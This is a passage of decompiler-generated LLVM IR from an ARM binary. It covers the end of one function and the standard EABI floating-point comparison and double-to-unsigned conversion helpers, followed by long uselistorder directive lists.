  br i1 %v5_1e3f8, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_1e3fc.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_1e3fc = phi i32 [ %v2_1e3fc.pre, %.thread..thread1_crit_edge ], [ %v1_1e3f4, %bb10 ]
  %v5_1e3fc = icmp eq i32 %v2_1e3fc, %v0_1e3f0
  br i1 %v5_1e3fc, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_1e404 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_1e404 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1e404, i32 %v0_1e404)
  %v0_1e408 = load i32, i32* @r0, align 4
  %v0_1e40c = load i32, i32* @r1, align 4
  %v1_1e40c = load i32, i32* @r3, align 4
  %v2_1e40c = xor i32 %v1_1e40c, %v0_1e40c
  %v3_1e40c = icmp slt i32 %v2_1e40c, 0
  br i1 %v3_1e40c, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_1e410 = icmp eq i32 %v0_1e40c, %v1_1e40c
  br i1 %v10_1e410, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_1e414 = load i32, i32* @r2, align 4
  %v4_1e414 = icmp ult i32 %v0_1e408, %v2_1e414
  br i1 %v4_1e414, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_1e410 = icmp ult i32 %v0_1e40c, %v1_1e40c
  br i1 %v4_1e410, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_1e40c, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_1e418 = and i32 %v1_1e40c, 1073741824
  %v3_1e418 = icmp eq i32 %v2_1e418, 0
  %v4_1e418 = ashr i32 %v1_1e40c, 31
  br i1 %v3_1e418, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_1e41c.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_1e418, %bb15 ]
  %v5_1e41c = sub nsw i32 -1, %v4_1e41c.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_1e420 = phi i32 [ %v4_1e418, %bb15 ], [ %v5_1e41c, %.thread3 ]
  %v1_1e420 = or i32 %v0_1e420, 1
  ret i32 %v1_1e420

dec_label_pc_1e428:                               ; preds = %bb
  br label %dec_label_pc_1e43c

dec_label_pc_1e434:                               ; preds = %dec_label_pc_1e3d8
  %v0_1e434 = load i32, i32* @r0, align 4
  %v4_1e434 = mul i32 %v0_1e3dc, 4096
  %v5_1e434 = or i32 %v0_1e434, %v4_1e434
  %v7_1e434 = icmp eq i32 %v5_1e434, 0
  br i1 %v7_1e434, label %dec_label_pc_1e434.dec_label_pc_1e43c_crit_edge, label %dec_label_pc_1e450

dec_label_pc_1e434.dec_label_pc_1e43c_crit_edge:  ; preds = %dec_label_pc_1e434
  %v2_1e3e4.off20 = add i32 %v2_1e3e4, 4194303
  %tmp22 = icmp ult i32 %v2_1e3e4.off20, 2097152
  br label %dec_label_pc_1e43c

dec_label_pc_1e43c:                               ; preds = %dec_label_pc_1e434.dec_label_pc_1e43c_crit_edge, %dec_label_pc_1e428
  %v3_1e440.pre-phi = phi i1 [ %tmp22, %dec_label_pc_1e434.dec_label_pc_1e43c_crit_edge ], [ true, %dec_label_pc_1e428 ]
  br i1 %v3_1e440.pre-phi, label %dec_label_pc_1e448, label %dec_label_pc_1e3f0

dec_label_pc_1e448:                               ; preds = %dec_label_pc_1e43c
  %v0_1e448 = load i32, i32* @r2, align 4
  %v4_1e448 = mul i32 %v0_1e3e4, 4096
  %v5_1e448 = or i32 %v0_1e448, %v4_1e448
  %v7_1e448 = icmp eq i32 %v5_1e448, 0
  br i1 %v7_1e448, label %dec_label_pc_1e3f0, label %dec_label_pc_1e450

dec_label_pc_1e450:                               ; preds = %dec_label_pc_1e434, %dec_label_pc_1e448
  ret i32 %v0_1e3d8

; uselistorder directives
  uselistorder i32 %v4_1e418, { 1, 0 }
  uselistorder i32 %v1_1e40c, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_1e40c, { 2, 1, 0 }
  uselistorder i32 %v1_1e3f4, { 1, 0 }
  uselistorder i32 %v2_1e3e4, { 0, 2, 1 }
  uselistorder i32 %v0_1e3e4, { 1, 0, 2 }
  uselistorder i32 %v2_1e3dc, { 1, 0 }
  uselistorder i32 %v0_1e3dc, { 1, 0, 2 }
  uselistorder i32 1073741824, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 31, { 10, 4, 2, 5, 6, 11, 3, 18, 12, 7, 8, 1, 13, 0, 14, 15, 16, 17, 9, 19 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 7, 5, 6, 8, 9, 10, 11, 30, 31, 32, 33, 34, 35, 36, 37, 38, 46, 47, 48, 49, 50, 58, 59, 60, 39, 12, 44, 65, 56, 40, 45, 70, 75, 73, 74, 72, 66, 67, 0, 42, 43, 68, 69, 71, 62, 63, 54, 14, 57, 15, 41, 1, 55, 13, 51, 52, 53, 61, 64, 2, 3, 4 }
  uselistorder i32* @r3, { 25, 26, 16, 17, 27, 28, 7, 29, 30, 31, 32, 51, 52, 53, 54, 55, 56, 57, 58, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 84, 2, 83, 6, 18, 20, 21, 85, 86, 107, 108, 3, 109, 110, 111, 4, 112, 113, 114, 5, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 0, 133, 134, 135, 136, 33, 34, 94, 95, 96, 35, 36, 37, 38, 39, 40, 19, 137, 143, 144, 145, 141, 59, 60, 61, 100, 101, 97, 62, 41, 42, 102, 103, 104, 105, 106, 9, 10, 11, 149, 146, 147, 148, 1, 150, 151, 152, 43, 44, 66, 22, 67, 68, 69, 70, 45, 46, 71, 142, 63, 64, 65, 138, 139, 140, 23, 24, 47, 48, 49, 50, 12, 13, 14, 15, 87, 88, 89, 90, 91, 92, 93, 8, 98, 99 }
  uselistorder i32* @r1, { 82, 83, 12, 84, 85, 86, 87, 88, 13, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 33, 34, 14, 35, 36, 100, 1, 101, 102, 103, 104, 105, 106, 107, 11, 108, 109, 110, 111, 153, 15, 154, 155, 156, 159, 16, 18, 160, 161, 162, 163, 164, 165, 168, 169, 170, 171, 172, 175, 183, 184, 185, 186, 187, 188, 189, 8, 37, 38, 190, 191, 176, 112, 39, 41, 192, 193, 199, 200, 157, 143, 177, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 19, 158, 0, 40, 42, 21, 32, 219, 166, 167, 2, 173, 174, 3, 4, 214, 135, 29, 22, 23, 24, 201, 202, 31, 208, 5, 205, 206, 207, 178, 179, 180, 124, 125, 126, 25, 194, 195, 196, 197, 198, 6, 209, 210, 9, 136, 137, 211, 26, 17, 7, 127, 128, 129, 10, 130, 131, 132, 27, 181, 182, 133, 134, 20, 216, 217, 28, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 138, 139, 140, 141, 142, 144, 145, 146, 147, 148, 149, 150, 151, 152, 203, 204, 212, 213, 30, 215, 218 }
  uselistorder i32* @ip, { 27, 17, 18, 19, 28, 29, 30, 31, 32, 33, 34, 71, 72, 73, 74, 75, 81, 82, 84, 85, 86, 87, 88, 89, 90, 91, 99, 1, 107, 106, 116, 117, 118, 119, 120, 121, 122, 123, 124, 126, 127, 125, 128, 10, 129, 11, 130, 131, 132, 133, 35, 36, 2, 37, 20, 83, 134, 135, 136, 150, 78, 79, 14, 39, 38, 6, 40, 41, 7, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 12, 202, 203, 204, 205, 206, 207, 208, 209, 210, 80, 42, 43, 44, 45, 46, 211, 212, 68, 92, 93, 3, 94, 95, 96, 97, 98, 156, 157, 158, 159, 13, 160, 161, 162, 100, 101, 102, 103, 104, 105, 163, 164, 151, 15, 111, 112, 47, 76, 77, 168, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 49, 48, 8, 216, 213, 214, 215, 9, 217, 108, 0, 22, 109, 4, 110, 23, 5, 24, 51, 52, 53, 54, 55, 56, 57, 58, 50, 59, 60, 61, 62, 63, 64, 65, 66, 21, 113, 114, 115, 67, 154, 155, 25, 26, 69, 70, 152, 153, 167, 166, 165, 16 }
  uselistorder label %dec_label_pc_1e450, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1e3f0, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_1e458 = load i32, i32* @r0, align 4
  %v0_1e45c = load i32, i32* @r2, align 4
  store i32 %v0_1e45c, i32* @r0, align 4
  store i32 %v0_1e458, i32* @r2, align 4
  %v0_1e470 = call i32 @__aeabi_cdcmple()
  ret i32 %v0_1e470
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_1e474 = load i32, i32* @r0, align 4
  %v1_1e478 = sext i32 %v3_1e474 to i64
  %v2_1e478 = bitcast i64 %v1_1e478 to double
  %v3_1e478 = load i32, i32* @r2, align 4
  %v4_1e478 = sext i32 %v3_1e478 to i64
  %v5_1e478 = bitcast i64 %v4_1e478 to double
  %v7_1e478 = fcmp oeq double %v2_1e478, %v5_1e478
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_1e478 = fcmp ule double %v2_1e478, %v5_1e478
  %not.v7_1e478 = xor i1 %v7_1e478, true
  %v1_1e47c = and i1 %not.v6_1e478, %not.v7_1e478
  store i1 %v7_1e478, i1* @cpsr_z, align 1
  br i1 %v1_1e47c, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_1e478, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_1e474

; uselistorder directives
  uselistorder i1 %v7_1e478, { 1, 2, 0 }
  uselistorder i32* @r2, { 13, 39, 40, 41, 42, 2, 43, 44, 45, 46, 47, 48, 10, 49, 101, 102, 106, 11, 108, 109, 110, 111, 112, 120, 127, 128, 129, 130, 131, 132, 18, 133, 134, 135, 50, 51, 21, 107, 19, 20, 154, 105, 136, 137, 138, 12, 83, 9, 168, 169, 170, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 145, 62, 63, 64, 65, 103, 104, 171, 172, 177, 178, 179, 180, 1, 183, 155, 156, 173, 113, 114, 115, 116, 117, 3, 174, 14, 4, 159, 160, 161, 5, 162, 163, 164, 165, 157, 158, 118, 119, 6, 7, 146, 122, 66, 67, 68, 69, 84, 94, 121, 0, 181, 8, 182, 70, 71, 72, 74, 73, 75, 76, 77, 78, 123, 124, 125, 79, 80, 126, 175, 176, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 81, 82, 85, 86, 87, 88, 89, 90, 91, 92, 93, 95, 96, 15, 16, 17, 97, 98, 99, 100, 139, 140, 141, 142, 143, 144, 147, 148, 149, 150, 151, 152, 153, 166, 167 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_1e490 = call i32 @__aeabi_cdcmple()
  %v0_1e494 = load i1, i1* @cpsr_z, align 1
  %.v0_1e490. = zext i1 %v0_1e494 to i32
  ret i32 %.v0_1e490.
}

define i32 @__aeabi_dcmplt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_1e4a8 = call i32 @__aeabi_cdcmple()
  %v0_1e4ac = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1e4ac to i32
  %.v0_1e4a8. = xor i32 %tmp2, 1
  ret i32 %.v0_1e4a8.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %v0_1e4c0 = call i32 @__aeabi_cdcmple()
  %v0_1e4c4 = load i1, i1* @cpsr_z, align 1
  %v1_1e4c4 = load i1, i1* @cpsr_c, align 1
  %v2_1e4c4 = xor i1 %v1_1e4c4, true
  %v3_1e4c4 = or i1 %v0_1e4c4, %v2_1e4c4
  %.v0_1e4c0 = select i1 %v3_1e4c4, i32 1, i32 %v0_1e4c0
  %v2_1e4c8 = xor i1 %v0_1e4c4, true
  %v3_1e4c8 = and i1 %v1_1e4c4, %v2_1e4c8
  %..v0_1e4c0 = select i1 %v3_1e4c8, i32 0, i32 %.v0_1e4c0
  ret i32 %..v0_1e4c0

; uselistorder directives
  uselistorder i1 %v1_1e4c4, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1e4d4 = load i32, i32* @lr, align 4
  store i32 %v0_1e4d4, i32* %stack_var_-8, align 4
  %v0_1e4d8 = call i32 @__aeabi_cdrcmple()
  %v0_1e4dc = load i1, i1* @cpsr_z, align 1
  %v1_1e4dc = load i1, i1* @cpsr_c, align 1
  %v2_1e4dc = xor i1 %v1_1e4dc, true
  %v3_1e4dc = or i1 %v0_1e4dc, %v2_1e4dc
  %.v0_1e4d8 = select i1 %v3_1e4dc, i32 1, i32 %v0_1e4d8
  %v2_1e4e0 = xor i1 %v0_1e4dc, true
  %v3_1e4e0 = and i1 %v1_1e4dc, %v2_1e4e0
  %..v0_1e4d8 = select i1 %v3_1e4e0, i32 0, i32 %.v0_1e4d8
  %v2_1e4e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1e4e4, i32* @lr, align 4
  ret i32 %..v0_1e4d8

; uselistorder directives
  uselistorder i1 %v1_1e4dc, { 1, 0 }
  uselistorder i1 true, { 3, 4, 5, 6, 0, 102, 1, 93, 7, 8, 9, 10, 11, 12, 85, 86, 94, 95, 87, 13, 14, 15, 88, 89, 90, 96, 16, 17, 18, 19, 22, 21, 20, 104, 105, 106, 107, 108, 109, 110, 91, 111, 112, 113, 98, 114, 115, 116, 117, 92, 118, 119, 120, 121, 122, 123, 124, 23, 125, 103, 126, 24, 25, 26, 27, 99, 30, 31, 32, 33, 28, 29, 100, 34, 101, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 97, 127, 64, 65, 66, 67, 2, 68, 69, 83, 70, 71, 72, 73, 84, 74, 75, 76, 77, 78, 79, 80, 81, 82 }
  uselistorder i1* @cpsr_z, { 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 0, 1, 2, 3, 4, 5, 6, 42, 7, 8, 9, 10, 11, 12, 13, 14, 38, 39, 40, 41, 15, 16, 17, 18, 37, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* @lr, { 22, 23, 24, 25, 26, 7, 8, 9, 10, 11, 27, 0, 28, 1, 29, 30, 31, 59, 60, 64, 65, 66, 70, 71, 72, 73, 74, 75, 76, 77, 80, 90, 91, 84, 92, 93, 94, 95, 96, 97, 98, 99, 12, 100, 101, 102, 110, 103, 104, 105, 106, 107, 108, 109, 32, 67, 68, 69, 55, 136, 137, 138, 139, 140, 141, 142, 143, 144, 85, 86, 61, 62, 63, 33, 34, 35, 36, 37, 38, 39, 40, 41, 58, 13, 14, 115, 116, 117, 53, 54, 56, 57, 113, 145, 146, 118, 119, 120, 121, 122, 81, 82, 83, 123, 124, 125, 126, 127, 128, 129, 2, 130, 131, 133, 134, 132, 111, 112, 16, 17, 18, 87, 88, 89, 42, 43, 44, 45, 46, 47, 3, 4, 48, 49, 50, 51, 15, 78, 79, 114, 135, 19, 20, 21, 52, 5, 6 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_1e4f0 = call i32 @__aeabi_cdrcmple()
  %v0_1e4f4 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1e4f4 to i32
  %.v0_1e4f0. = xor i32 %tmp2, 1
  ret i32 %.v0_1e4f0.

; uselistorder directives
  uselistorder i32 1, { 580, 593, 701, 594, 581, 1079, 1037, 1080, 702, 239, 240, 236, 235, 234, 237, 241, 238, 1081, 703, 1082, 704, 183, 185, 181, 182, 184, 415, 229, 228, 550, 269, 705, 413, 414, 1083, 1084, 163, 162, 1085, 501, 502, 503, 706, 210, 211, 206, 207, 208, 209, 1165, 505, 1166, 1172, 604, 1173, 1174, 707, 22, 23, 24, 21, 27, 25, 26, 708, 328, 327, 1175, 605, 606, 1178, 1192, 711, 710, 709, 418, 417, 419, 416, 1194, 712, 193, 194, 1195, 551, 1196, 1197, 713, 382, 383, 1198, 714, 195, 298, 297, 270, 1199, 716, 715, 268, 267, 266, 717, 265, 607, 1200, 1201, 1202, 522, 1203, 587, 552, 1204, 1205, 525, 1206, 1207, 720, 719, 718, 423, 421, 422, 420, 721, 426, 425, 424, 1208, 1209, 1210, 1219, 1220, 1221, 1228, 608, 609, 730, 729, 728, 727, 698, 726, 725, 724, 723, 722, 428, 429, 431, 430, 432, 427, 1231, 731, 179, 177, 178, 180, 582, 1255, 1256, 575, 1257, 1259, 506, 1260, 611, 571, 570, 610, 1261, 517, 534, 568, 588, 1262, 1263, 1264, 1265, 1266, 0, 1267, 1258, 612, 1268, 577, 739, 689, 738, 737, 736, 735, 734, 733, 732, 20, 18, 17, 19, 1269, 1270, 1271, 1272, 1273, 507, 1274, 740, 224, 221, 223, 219, 218, 220, 225, 222, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 553, 1046, 1047, 744, 743, 742, 741, 293, 294, 295, 296, 1048, 1049, 1050, 1051, 1052, 747, 746, 745, 202, 197, 201, 204, 200, 199, 198, 196, 205, 203, 554, 1275, 555, 1276, 1277, 1278, 1279, 1, 1280, 1281, 1282, 1283, 1284, 1285, 749, 748, 102, 101, 104, 105, 100, 106, 103, 595, 1286, 1287, 1288, 1289, 1290, 750, 244, 243, 245, 246, 242, 1232, 751, 433, 434, 435, 752, 230, 753, 212, 213, 214, 215, 754, 59, 58, 60, 1086, 1087, 1088, 755, 438, 440, 439, 436, 437, 756, 63, 64, 61, 67, 65, 62, 66, 71, 76, 70, 75, 79, 78, 74, 77, 72, 73, 757, 86, 85, 83, 82, 84, 80, 81, 758, 28, 29, 36, 37, 33, 34, 32, 35, 30, 31, 441, 252, 251, 248, 247, 556, 1291, 1292, 1311, 1312, 760, 759, 13, 15, 16, 14, 526, 576, 527, 1354, 1355, 1356, 1357, 557, 761, 10, 1152, 1153, 11, 12, 535, 1179, 1423, 1180, 1181, 1182, 536, 1154, 1184, 1183, 513, 762, 1155, 763, 443, 444, 445, 442, 1089, 537, 1090, 1425, 538, 1426, 1427, 1428, 1429, 1430, 1431, 1022, 1432, 1433, 1434, 1435, 1436, 1437, 1023, 690, 765, 764, 349, 350, 351, 346, 345, 347, 348, 342, 344, 343, 613, 1233, 1234, 1240, 1241, 766, 691, 50, 51, 1185, 1186, 767, 227, 226, 539, 558, 1091, 1092, 1093, 614, 1094, 523, 559, 518, 540, 1095, 615, 1096, 1097, 1098, 2, 1099, 511, 1100, 508, 1101, 616, 1102, 1103, 1104, 560, 1105, 780, 779, 778, 777, 776, 775, 774, 773, 772, 771, 770, 769, 692, 768, 115, 124, 114, 116, 126, 119, 117, 120, 118, 125, 127, 122, 121, 123, 128, 1330, 1331, 167, 165, 170, 172, 168, 169, 166, 171, 250, 519, 781, 409, 410, 782, 49, 1235, 1236, 1237, 783, 45, 47, 46, 48, 42, 41, 43, 44, 1106, 785, 784, 129, 131, 130, 132, 134, 133, 561, 589, 788, 787, 786, 617, 1193, 789, 411, 1187, 1188, 1189, 1190, 1191, 618, 790, 352, 355, 353, 354, 356, 619, 357, 1053, 791, 278, 620, 792, 397, 621, 793, 281, 279, 280, 794, 89, 88, 87, 795, 388, 387, 271, 796, 333, 797, 392, 391, 798, 407, 405, 406, 799, 310, 800, 371, 370, 801, 446, 802, 361, 803, 394, 804, 805, 273, 274, 562, 622, 623, 624, 625, 1145, 806, 285, 1438, 626, 1439, 1440, 627, 807, 95, 90, 96, 93, 91, 97, 94, 98, 92, 290, 628, 276, 275, 808, 447, 448, 449, 99, 809, 1367, 1368, 812, 811, 810, 338, 520, 1034, 1035, 1036, 813, 1146, 816, 815, 814, 358, 817, 528, 1214, 529, 1215, 1216, 521, 1217, 451, 452, 450, 453, 455, 454, 456, 1218, 530, 1054, 140, 143, 142, 141, 144, 1167, 563, 1168, 819, 818, 148, 146, 145, 152, 150, 151, 149, 147, 820, 402, 404, 400, 398, 399, 401, 403, 821, 186, 191, 187, 190, 189, 192, 188, 822, 823, 1441, 564, 629, 825, 824, 826, 1371, 1374, 1375, 1376, 827, 481, 486, 487, 485, 484, 488, 482, 483, 1377, 1378, 1379, 1380, 828, 493, 499, 492, 498, 497, 491, 500, 490, 495, 489, 494, 496, 1372, 1373, 630, 287, 286, 1222, 631, 1223, 1224, 1225, 1226, 1227, 829, 54, 55, 53, 56, 1381, 1382, 1383, 1384, 1385, 1386, 583, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 633, 1395, 1396, 1397, 1398, 1399, 632, 1400, 1401, 1402, 1403, 1404, 830, 255, 257, 253, 256, 261, 263, 260, 262, 264, 258, 259, 254, 233, 232, 634, 635, 1144, 524, 834, 833, 832, 831, 277, 57, 541, 311, 835, 217, 216, 380, 836, 381, 837, 408, 838, 369, 231, 839, 341, 340, 840, 303, 841, 842, 1332, 1333, 844, 843, 457, 458, 1247, 845, 1323, 1324, 3, 52, 1107, 1108, 846, 459, 1176, 1177, 542, 1424, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 847, 366, 364, 365, 367, 368, 1343, 1344, 68, 69, 1147, 1148, 1149, 1150, 40, 39, 543, 1109, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 38, 1230, 1229, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1442, 173, 174, 175, 176, 164, 636, 848, 1245, 1242, 1243, 1244, 572, 544, 139, 135, 136, 137, 138, 1239, 849, 153, 155, 156, 157, 154, 637, 1238, 851, 850, 463, 461, 464, 460, 462, 465, 1057, 852, 299, 1246, 853, 302, 301, 300, 1058, 854, 160, 159, 161, 158, 578, 1110, 1111, 639, 1112, 1113, 1114, 1115, 1116, 640, 1117, 1118, 1119, 1120, 1121, 641, 1123, 566, 565, 1122, 638, 1124, 1125, 642, 1126, 1127, 1128, 859, 693, 858, 857, 856, 855, 315, 313, 314, 318, 322, 312, 319, 320, 316, 321, 317, 1129, 860, 467, 471, 469, 470, 466, 468, 545, 861, 360, 359, 1130, 1131, 1132, 325, 326, 323, 324, 579, 512, 1134, 1135, 531, 1136, 1137, 4, 5, 1138, 1140, 514, 1141, 644, 1142, 532, 1139, 643, 871, 870, 869, 868, 867, 866, 865, 864, 863, 862, 108, 110, 109, 645, 546, 872, 111, 112, 113, 1133, 590, 694, 873, 472, 1055, 874, 374, 373, 375, 378, 376, 372, 377, 646, 1056, 1248, 1249, 1250, 1251, 647, 1252, 1253, 1254, 547, 877, 876, 875, 474, 473, 477, 476, 475, 478, 567, 879, 878, 880, 1211, 1212, 1213, 882, 881, 384, 385, 883, 396, 395, 884, 337, 339, 885, 379, 886, 479, 887, 332, 331, 283, 282, 363, 362, 888, 330, 329, 889, 304, 890, 891, 306, 305, 892, 309, 308, 893, 480, 307, 894, 895, 335, 334, 896, 393, 897, 289, 288, 509, 1405, 292, 291, 1059, 515, 533, 1060, 1061, 1062, 510, 650, 1063, 1064, 1065, 584, 1066, 1067, 1068, 1069, 1070, 648, 649, 585, 651, 1071, 904, 903, 902, 901, 900, 899, 898, 905, 1072, 1073, 912, 911, 910, 909, 908, 695, 907, 906, 652, 1074, 1075, 914, 913, 653, 1076, 1077, 654, 655, 656, 916, 915, 657, 658, 917, 1078, 921, 920, 919, 699, 918, 1143, 659, 925, 924, 923, 700, 922, 1151, 927, 926, 1156, 1157, 660, 933, 932, 931, 930, 929, 928, 386, 1158, 1159, 661, 1160, 1161, 1162, 1163, 939, 938, 937, 936, 935, 934, 336, 1164, 944, 943, 942, 941, 940, 1169, 662, 1031, 1032, 665, 1033, 663, 664, 1021, 1170, 1171, 953, 952, 951, 950, 949, 948, 947, 946, 945, 390, 389, 666, 667, 668, 957, 956, 955, 954, 596, 1313, 958, 961, 960, 959, 6, 669, 573, 1314, 963, 962, 591, 1315, 670, 671, 1317, 1316, 672, 966, 965, 964, 597, 1318, 1319, 673, 674, 675, 1325, 696, 1320, 676, 968, 967, 592, 677, 678, 1321, 679, 1322, 976, 975, 974, 973, 972, 971, 970, 969, 598, 1326, 1327, 599, 977, 978, 1328, 680, 1329, 981, 980, 979, 983, 982, 985, 984, 569, 1334, 1335, 1336, 681, 516, 1337, 1338, 1339, 682, 1340, 989, 988, 987, 986, 697, 1341, 412, 1342, 990, 683, 1352, 993, 992, 991, 1353, 107, 601, 1358, 1359, 600, 1360, 1361, 602, 603, 1362, 1363, 994, 1364, 7, 8, 1366, 1365, 684, 997, 996, 995, 685, 1369, 1370, 999, 998, 1002, 1001, 1000, 1005, 1004, 1003, 1007, 1006, 1406, 1407, 686, 1416, 1417, 574, 1418, 1010, 1009, 1008, 586, 9, 1014, 1013, 1012, 1011, 549, 1408, 1409, 1410, 548, 1411, 1414, 1415, 687, 1016, 1015, 688, 1412, 1413, 1018, 1017, 284, 1419, 1420, 249, 1421, 1422, 272, 1019, 1020, 504 }
  uselistorder i1 false, { 38, 14, 15, 12, 16, 51, 52, 53, 54, 55, 56, 9, 10, 13, 57, 58, 59, 11, 39, 36, 40, 41, 42, 43, 44, 4, 17, 18, 37, 2, 31, 60, 0, 22, 23, 24, 45, 19, 21, 46, 47, 48, 49, 50, 33, 3, 6, 61, 20, 25, 28, 27, 26, 29, 7, 8, 1, 30, 5, 35, 32, 34, 62, 63, 64, 65 }
  uselistorder i1* @cpsr_c, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1e504 = icmp slt i32 %arg2, 0
  %v2_1e504 = mul i32 %arg2, 2
  br i1 %v1_1e504, label %dec_label_pc_1e538, label %dec_label_pc_1e50c

dec_label_pc_1e50c:                               ; preds = %entry
  %v1_1e50c = add i32 %v2_1e504, 2097152
  %v2_1e50c = icmp ugt i32 %v2_1e504, -2097153
  br i1 %v2_1e50c, label %dec_label_pc_1e540, label %dec_label_pc_1e514

dec_label_pc_1e514:                               ; preds = %dec_label_pc_1e50c
  %v6_1e50c = icmp slt i32 %v1_1e50c, 0
  br i1 %v6_1e50c, label %dec_label_pc_1e518, label %dec_label_pc_1e538

dec_label_pc_1e518:                               ; preds = %dec_label_pc_1e514
  %v4_1e51c = sdiv i32 %v1_1e50c, 2097152
  %v5_1e51c = sub nsw i32 -993, %v4_1e51c
  %v11_1e51c = icmp slt i32 %v5_1e51c, 0
  br i1 %v11_1e51c, label %dec_label_pc_1e548, label %dec_label_pc_1e524

dec_label_pc_1e524:                               ; preds = %dec_label_pc_1e518
  %v3_1e524 = mul i32 %arg2, 2048
  %v4_1e52c = udiv i32 %arg1, 2097152
  %v1_1e528 = or i32 %v4_1e52c, %v3_1e524
  %v5_1e52c = or i32 %v1_1e528, -2147483648
  %v6_1e530 = lshr i32 %v5_1e52c, %v5_1e51c
  ret i32 %v6_1e530

dec_label_pc_1e538:                               ; preds = %dec_label_pc_1e514, %entry
  ret i32 0

dec_label_pc_1e540:                               ; preds = %dec_label_pc_1e50c
  %v4_1e540 = mul i32 %arg2, 4096
  %v5_1e540 = or i32 %v4_1e540, %arg1
  %v7_1e540 = icmp eq i32 %v5_1e540, 0
  br i1 %v7_1e540, label %dec_label_pc_1e548, label %dec_label_pc_1e550

dec_label_pc_1e548:                               ; preds = %dec_label_pc_1e540, %dec_label_pc_1e518
  ret i32 -1

dec_label_pc_1e550:                               ; preds = %dec_label_pc_1e540
  ret i32 0

; uselistorder directives
